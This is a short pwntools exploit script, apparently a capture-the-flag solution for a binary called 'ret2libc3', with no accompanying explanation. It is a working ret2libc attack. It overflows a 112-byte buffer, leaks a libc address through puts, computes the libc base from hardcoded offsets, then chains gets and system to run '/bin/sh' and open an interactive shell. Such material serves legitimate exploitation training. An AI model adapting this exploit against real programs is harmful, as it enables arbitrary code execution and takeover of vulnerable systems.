from pwn import *

sh = process('ret2libc3')

start_addr = 0x080484D0
put_plt = 0x08048460
libc_main_addr = 0x0804a024


payload = 112 * 'a' + p32(put_plt) + p32(start_addr) + p32(libc_main_addr)

sh.recv()
sh.sendline(payload)

libc_real_addr = u32(sh.recv(4))

print "real_addr is:" + hex(libc_real_addr)

sh.recv()

addr_base = libc_real_addr - 0x018eb0

system_plt = addr_base + 0x03cf10

buf2 = 0x0804A080

gets_plt = 0x08048440

payload = b'A' * 112 + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()



